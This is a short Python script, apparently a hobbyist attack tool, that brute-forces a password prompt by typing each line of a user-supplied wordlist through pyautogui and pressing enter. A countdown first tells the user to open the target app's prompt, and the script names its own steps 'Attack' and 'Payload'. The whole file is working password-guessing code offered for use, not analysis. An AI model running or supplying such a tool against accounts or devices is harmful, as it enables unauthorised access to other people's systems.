import time
from pyautogui import press, typewrite, hotkey
print("\n")
f = open("label.txt", "r")
print(f.read())
def countdown(t):
    #line
    print("[+] Attack will start in (Please open password prompt of your app):")
    while t:
        mins, secs = divmod(t, 60)
        timer = '{:02d}:{:02d}'.format(mins, secs)
        print(timer, end="\r")
        time.sleep(1)
        t -= 1
def password_try(password):
    #line
    time.sleep(1)
    typewrite(str(password))
    press('enter')
def main():
    start_up=input("[+] Please Enter Startup Time (In second):")
    dictionary=input("[+] Please enter textfile:")
    countdown(int(start_up))
    time.sleep(int(start_up))
    print("[+] Payload Started")
    file1 = open(str(dictionary), 'r')
    Lines = file1.readlines()
    i=0
    for line in Lines:
        if i > 0:
            press('enter')
        password=line.strip()
        password_try(password)
        i=i+1
main()
